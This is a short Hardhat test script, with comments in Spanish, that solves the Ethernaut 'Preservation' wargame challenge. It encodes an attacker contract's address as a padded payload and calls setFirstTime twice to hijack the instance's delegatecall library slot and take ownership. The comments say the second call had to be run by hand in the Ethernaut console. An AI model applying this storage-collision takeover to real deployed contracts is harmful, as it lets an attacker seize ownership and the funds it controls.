import { assert } from "chai";
import { ethers } from "hardhat";

describe("Executing", function () {
  it("PreservationAttacker debe tomar ownership", async function () {

    // Deploy contracts
    //const gatekeeperContract = await (await ethers.getContractFactory("GatekeeperOne")).deploy();
    //const hackGatekeeperContract = await (await ethers.getContractFactory("HackGatekeeperOne")).deploy();
    //await Promise.all([gatekeeperContract, hackGatekeeperContract].map((contract) => contract.deployed()));

    // Attach to contracts
    const toa='0x2A08Ef7E8D130d5Ad01cF5F6FeD3ca42Fac65C7a' //direccion contrato ethernaut gate instanciado
    const ethernautContract = await (await ethers.getContractFactory("Preservation")).attach(toa);

    const toa2='0xb3cc34d8721fFC308D80F62FC4Da48CBeBA7995F'; //direccion contrato exploit
    
    //Primero cambiamos la direccion del contrato invocado
    const relleno64="0x000000000000000000000000";
    console.log("Payload",relleno64.concat(toa2.substring(2)));
    await ethernautContract.setFirstTime(relleno64.concat(toa2.substring(2)));

    //La segunda vez se ejecutarà el contrato malicioso q cambia el owner por el msg.sender
    //(no se porque no me resulta desde aqui, lo tuve que ejecutar en la consola del ethernaut)
    await ethernautContract.setFirstTime(relleno64.concat(toa2.substring(2))); 
  });
});